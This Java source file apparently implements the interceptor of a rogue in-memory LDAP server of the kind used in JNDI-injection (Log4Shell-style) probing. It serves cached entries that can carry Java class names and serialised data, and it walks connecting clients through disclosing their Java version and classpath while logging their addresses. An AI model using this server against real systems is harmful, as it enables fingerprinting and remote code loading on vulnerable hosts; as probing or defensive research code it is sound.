package dev.sonatype.slyserver;

import com.unboundid.ldap.listener.interceptor.*;
import com.unboundid.ldap.sdk.*;
import org.jboss.logging.Logger;

import javax.inject.Singleton;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@Singleton
public class Interceptor extends InMemoryOperationInterceptor {


    private static final Logger log = Logger.getLogger(Interceptor.class);

   // @Inject
   // @RestClient
   // FormInterface extensionsService;

    public static Map<String, CacheEntry> cache=new HashMap<>();

    private String frontend;

    /**
     * Simple sidestepping of java schema validation
     * Added objects are cached for easy access later
     */
    @Override
    public void processAddRequest(InMemoryInterceptedAddRequest request) throws LDAPException {

        log.info("intercepted added request");

        ReadOnlyAddRequest roa=request.getRequest();


       CacheEntry ce=new CacheEntry();
        ce.dn=roa.getDN();
        ce.attributes=roa.getAttributes();

        cache.put(ce.dn,ce);



    }


    /**
     * Add always succeeds
     * @param result
     */
    @Override
    public void processAddResult(InMemoryInterceptedAddResult result) {

        log.info("intercepted in memory added request");
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    /**
     * Search request handler.
     * Stores the search request data
     *
     * @param result
     */
    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {

        log.info("intercepted search request");

        String addr=result.getConnectedAddress();

        String key=result.getRequest().getBaseDN();

        log.infof("search request from %s, key [%s]",addr,key);

        CacheEntry ce=handleRequest(key,addr);

        Entry e=new Entry(ce.dn);
        for(Attribute a:ce.attributes) {
            e.addAttribute(a);
        }

        try {
            result.sendSearchEntry(e);
        } catch (LDAPException ex) {
            ex.printStackTrace();

            result.setResult(new LDAPResult(0, ResultCode.NO_SUCH_OBJECT));
        }

        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

    }


    public  CacheEntry handleRequest(String key,String addr) {


    log.infof("handle request %s",key);

        if(cache.containsKey(key)) {
            return cache.get(key);
        }

        if(key.equals("a")) {
            // starting conversation ..
            // request java version

            return cache.get("cn=getversion");

        }

        if(key.startsWith("echo/")) {

            String data=key.substring(5);
            log.infof("echo requested %s / %s",data,key);
            LdapServerUploader.upload("cn=echo",addr+" sent us this "+data);
            return cache.get("cn=echo");
        }


        if(key.startsWith("version/")) {
            System.out.println(key);
            System.out.println("ask for classpath");
            return cache.get("cn=getclasspath");

        }

        if(key.startsWith("classpath/")) {
            System.out.println(key);
            return cache.get("cn=saythankyou");

        }

        return cache.get("cn=404");

    }




    public static class CacheEntry {

        public List<Attribute> attributes;
        public String dn;
        public String[] objectClass;
        public String[] javaClassNames;
        public String javaClassName;
        public String cn;
        public byte[] javaSerialisedData;
    }

}
